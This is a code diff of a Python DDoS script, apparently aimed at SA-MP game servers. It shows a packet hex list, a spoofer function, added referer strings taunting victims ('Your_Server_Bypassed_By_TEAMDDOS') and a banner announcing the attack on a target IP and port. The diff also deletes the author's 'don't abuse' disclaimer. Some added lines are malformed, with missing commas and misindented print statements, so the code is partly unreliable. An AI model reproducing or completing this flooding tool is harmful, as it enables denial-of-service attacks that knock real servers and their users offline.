@@ -19,19 +19,52 @@ Pacotes = [
  codecs.decode('081e4dda', 'hex_codec'),
  codecs.decode('021efd40', 'hex_codec'),
  codecs.decode('081e7eda', 'hex_codec')]
- 
- 
-os.system("clear");
+
+referers = [
+     'Your_Server_Bypassed_By_TEAMDDOS',
+     'Your_Server_Bypassed_By_TEAMDDOS',
+     'Your_Server_Bypassed_By_TEAMDDOS',
+     'Your_Server_Bypassed_By_TEAMDDOS',
+     'Your_Server_Bypassed_By_TEAMDDOS',
+     'Your_Server_Bypassed_By_TEAMDDOS',
+     'Your_Server_Bypassed_By_TEAMDDOS',
+     'Your_Server_Bypassed_By_TEAMDDOS',
+     'Your_Server_Bypassed_By_TEAMDDOS',
+     'Your_Server_Bypassed_By_TEAMDDOS',
+     'Your_Server_Bypassed_By_TEAMDDOS',
+     'Your_Server_Bypassed_By_TEAMDDOS',
+     'Your_Server_Bypassed_By_TEAMDDOS',
+     'Your_Server_Bypassed_By_TEAMDDOS',
+     'Your_Server_Bypassed_By_TEAMDDOS',
+     'Your_Server_Bypassed_By_TEAMDDOS',
+     'Your_Server_Bypassed_By_TEAMDDOS',
+     'Your_Server_Bypassed_By_TEAMDDOS',
+     'Your_Server_Bypassed_By_TEAMDDOS',
+     'Your_Server_Bypassed_By_TEAMDDOS',
+     'Your_Server_Bypassed_By_TEAMDDOS',
+     'Your_Server_Bypassed_By_TEAMDDOS',
+     'Your_Server_Bypassed_By_TEAMDDOS',
+     'Your_Server_Bypassed_By_TEAMDDOS'
+     'Your_Server_Bypassed_By_TEAMDDOS'
+     'Your_Server_Bypassed_By_TEAMDDOS',
+     'Your_Server_Bypassed_By_TEAMDDOS',
+     'Your_Server_Bypassed_By_TEAMDDOS',
+     'Your_Server_Bypassed_By_TEAMDDOS',
+     'Your_Server_Bypassed_By_TEAMDDOS',
+     'Your_Server_Bypassed_By_TEAMDDOS'
+     'Your_Server_Bypassed_By_TEAMDDOS']
+
+os.system("clear")
 print
 print "===================================================================="
-print "|Author     : Grizzly                                 |"
-print "|Name Tools : TOOLS DDOS TEAM                                            |"
+print "|Author     : Grizzly                                   |"
+print "|Name Tools : DDOS SAMP                                            |"
 print "|Github     : https://github.com/Grizzly.               |"
 print "|Youtube    : https://www.youtube.com/@GrizzlyReal |"
 print "|Note       : CTRL+Z For Stop It.                                  |"
-print "|DON'T ABUSE MY TOOLS|"
 print "|==================================================================="
-
+print
+print ("\033[31m             ATTACK TO IP \033[36m%s \033[31m║ ║\033[31m  AND ATTACK TO PORT \033[36m%s"%(ip,port))                                    
 
 
 def spoofer():
@@ -85,10 +118,9 @@ if __name__ == '__main__':
 
     except KeyboardInterrupt:
         os.system('cls' if os.name == 'nt' else 'clear')
-        print ("╔════════════════════════════════════╗")
-        print ("         ╔═╗╔╦╗╔═╗╔═╗╔═╗╔═╗╔╦╗        ")
-        print ("         ╚═╗ ║ ║ ║╠═╝╠═╝║╣  ║║        ")
-        print ("         ╚═╝ ╩ ╚═╝╩  ╩  ╚═╝═╩╝        ")
-        print ("╚════════════════════════════════════╝")
-        print ('\n\n')
-        print ('STOP TO ATTACK {}').format(orgip)
+         print('#########################################################################')
+         print('STOP ATTACK')
+         print('#########################################################################')
+         print('\n\n')
+         print('{}'.format(orgip))
+         pass
